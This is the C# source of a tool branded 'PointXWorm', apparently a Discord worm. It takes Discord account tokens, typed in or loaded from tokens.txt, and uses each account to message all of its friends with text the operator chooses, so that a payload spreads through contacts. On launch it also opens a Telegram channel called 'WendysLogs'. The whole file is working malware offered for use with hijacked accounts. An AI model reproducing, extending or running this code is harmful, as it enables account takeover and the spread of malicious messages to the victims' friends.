using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Threading;
using Spectre.Console;

class Program
{
    static int sent = 0;
    static void Main()
    {

        Console.Clear();
        System.Diagnostics.Process.Start("https://t.me/WendysLogs");

        Console.Title = "PointXWorm | #1 The Best Discord Worm AIO";
        int selfSpreadDelay = 750 / 100; // delay so no ratelimit, I recommend 750 / 100

        string logo = @"
     ____        _       __ _  ___       __                   
    / __ \____  (_)___  / /| |/ / |     / /___  _________ ___ 
   / /_/ / __ \/ / __ \/ __/   /| | /| / / __ \/ ___/ __ `__ \
  / ____/ /_/ / / / / / /_/   | | |/ |/ / /_/ / /  / / / / / /
 /_/    \____/_/_/ /_/\__/_/|_| |__/|__/\____/_/  /_/ /_/ /_/ 
          
              [blue] Discord Worm Dev By @PointX_x [/]
";

        AnsiConsole.MarkupLine($"[cyan]{logo}[/]");

        AnsiConsole.MarkupLine(" ([blue]1[/]) - Worm Single");
        AnsiConsole.MarkupLine(" ([blue]2[/]) - Worm Mass");
        AnsiConsole.MarkupLine(" ([blue]3[/]) - {SOON TOKEN JOIN}");
        AnsiConsole.MarkupLine(" ([blue]4[/]) - {SOON TOKEN INFO}");
        AnsiConsole.MarkupLine(" ([blue]5[/]) - {SOON USER INFO}");





        AnsiConsole.Markup("\n INPUT [cyan]>>>>[/] ");

        int input = int.Parse(Console.ReadLine());

        if(input == 1 )
        {
            
           
            List<string> tokens = new List<string>();
            string tokenInput;

            do
            {
                Console.Clear();
                AnsiConsole.MarkupLine($"[cyan]{logo}[/]");
                AnsiConsole.MarkupLine("\n ([blue]+[/]) Enter Discord token (or '[lime]done[/]' to start): ");
                AnsiConsole.Markup("\n ENTER TOKEN [cyan]>>>>[/] ");
                tokenInput = Console.ReadLine().Trim();
                if (tokenInput.ToLower() != "done")
                    tokens.Add(tokenInput);
            }
            while (tokenInput.ToLower() != "done");

            if (tokens.Count == 0)
            {
                AnsiConsole.MarkupLine("\n ([red]-[/])  No tokens provided. Exiting. \n");
                return;
            }

            string message;



            AnsiConsole.Markup("\n ENTER MESSAGE [cyan]>>>>[/] ");
            message = Console.ReadLine(); // Get file contents
            

            foreach (string token in tokens)
            {
                AnsiConsole.MarkupLine("\n ([lime]+[/]) Starting process for token: " + token);
                Spread(token, message, selfSpreadDelay);
                sent++;
            }

            Console.WriteLine("All tokens processed. Exiting.");
            Console.WriteLine("Checked Finished!");
            Console.ReadLine();
            Main();
        }
        else if(input == 2 ) 
        {
            Console.Title = $"PointXWorm | Single Module - Sent: {sent}";

            List<string> tokens = LoadTokensFromFile("tokens.txt");
            if (tokens.Count == 0)
            {
                AnsiConsole.MarkupLine("\n ([red]-[/]) No tokens provided in the 'tokens.txt' file. Exiting.");
                return;
            }

            string message;
            AnsiConsole.Markup("\n ENTER MESSAGE [cyan]>>>>[/] ");
            message = Console.ReadLine(); // Get file contents

            foreach (string token in tokens)
            {
                AnsiConsole.MarkupLine("\n ([cyan]+[/]) Starting process for token: " + $"[darkblue]{token}[/]\n");
                Spread(token, message, selfSpreadDelay);
            }

            Console.WriteLine("Checked Finished!");
            Console.ReadLine();
            Main();
        }
        else
        {
            AnsiConsole.MarkupLine("\n ([red]-[/]) Invalid Selection");
            Console.ReadLine();
            Main();

        }
    }

    static List<string> LoadTokensFromFile(string filePath)
    {
        List<string> tokens = new List<string>();
        try
        {
            using (StreamReader reader = new StreamReader(filePath))
            {
                while (!reader.EndOfStream)
                {
                    string token = reader.ReadLine().Trim();
                    if (!string.IsNullOrEmpty(token))
                        tokens.Add(token);
                }
            }
        }
        catch (FileNotFoundException)
        {
            AnsiConsole.MarkupLine("\n ([red]-[/]) The 'tokens.txt' file was not found. Make sure it exists in the same directory as the executable.");
        }
        catch (Exception ex)
        {
            AnsiConsole.MarkupLine("\n ([red]-[/]) Error loading tokens from 'tokens.txt': " + ex.Message);
        }
        return tokens;
    }


    static HttpRequest CreateRequest(string token, string contentType = "application/json")
    {
        HttpRequest request = new HttpRequest();
        request.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11";
        request.AddHeader("Authorization", token);
        request.IgnoreProtocolErrors = true; // Ignore certificate errors, use with caution!
        request.KeepAlive = true;
        request.ConnectTimeout = 15000; // 15 seconds
        request.ReadWriteTimeout = 15000; // 15 seconds
        request.AcceptEncoding = Encoding.UTF8.ToString();
        request.Cookies = new CookieStorage();

        if (contentType != null)
            request.AddHeader("Content-Type", contentType);

        return request;
    }

    static List<dynamic> GetFriends(string token)
    {
        using (HttpRequest request = CreateRequest(token))
        {
            HttpResponse response = request.Get("https://discordapp.com/api/v6/users/@me/relationships");
            if (response.StatusCode == HttpStatusCode.OK)
            {
                string content = response.ToString();
                return new List<dynamic>(JsonConvert.DeserializeObject<dynamic>(content));
            }
        }

        return null;
    }

    static string GetChat(string token, string uid)
    {
        try
        {
            using (HttpRequest request = CreateRequest(token))
            {
                string jsonData = JsonConvert.SerializeObject(new { recipient_id = uid });
                HttpResponse response = request.Post("https://discordapp.com/api/v6/users/@me/channels", jsonData, "application/json");
                dynamic responseJson = JsonConvert.DeserializeObject<dynamic>(response.ToString());
                return responseJson["id"];
            }
        }
        catch
        {
            return null;
        }
    }

    static void Spread(string token, string message, int delay)
    {
        List<dynamic> friends = GetFriends(token);
        if (friends == null)
        {
            AnsiConsole.MarkupLine("\n ([red]-[/]) Error: Unable to get friends list for token: " + token);
            return;
        }

        foreach (dynamic friend in friends)
        {
            try
            {
                using (HttpRequest request = CreateRequest(token, "application/json"))
                {
                    string uid = friend["id"].ToString(); // Get the UID as a string
                    string chatId = GetChat(token, uid);

                    if (chatId == null)
                    {
                        AnsiConsole.MarkupLine("\n ([red]-[/]) Error: Unable to get chat ID for friend: " + friend["user"]["username"]);
                        continue;
                    }

                    string jsonData = JsonConvert.SerializeObject(new
                    {
                        content = message,
                        tts = false
                    });

                    string url = $"https://discordapp.com/api/v6/channels/{chatId}/messages";
                    HttpResponse response = request.Post(url, jsonData, "application/json");

                    if (response.StatusCode == HttpStatusCode.OK)
                        AnsiConsole.MarkupLine("\n ([cyan]-[/]) Sent message to friend: " + friend["user"]["username"]);
                    sent++;
                    Console.Title = $"PointXWorm | Single Module - Sent: {sent}";

                }
            }
            catch (Exception ex)
            {
                AnsiConsole.MarkupLine("\n ([red]-[/])Error sending message to friend: " + ex.Message);
            }

            Thread.Sleep(delay);
        }
    }


}
